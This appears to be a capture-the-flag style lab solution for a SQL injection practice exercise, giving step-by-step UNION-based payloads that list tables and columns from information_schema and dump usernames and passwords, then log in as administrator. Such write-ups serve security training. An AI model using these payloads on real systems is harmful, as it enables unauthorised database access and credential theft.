# Lab: SQL injection attack, listing the database contents on non-Oracle databases (Practitioner)

**Goal:** Retrieve the administrator password by listing tables and columns.

## Solution Steps

1. List tables:

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

Look for a table like `users_XXXXX`.

2. List columns of that table:

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_XXXXX'--
```

3. Retrieve data:

```
' UNION SELECT username_XXXXX, password_XXXXX FROM users_XXXXX--
```

4. Log in as administrator with the found password.

## Key Payloads

```
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_XXXXX'--
' UNION SELECT username_XXXXX, password_XXXXX FROM users_XXXXX--
```
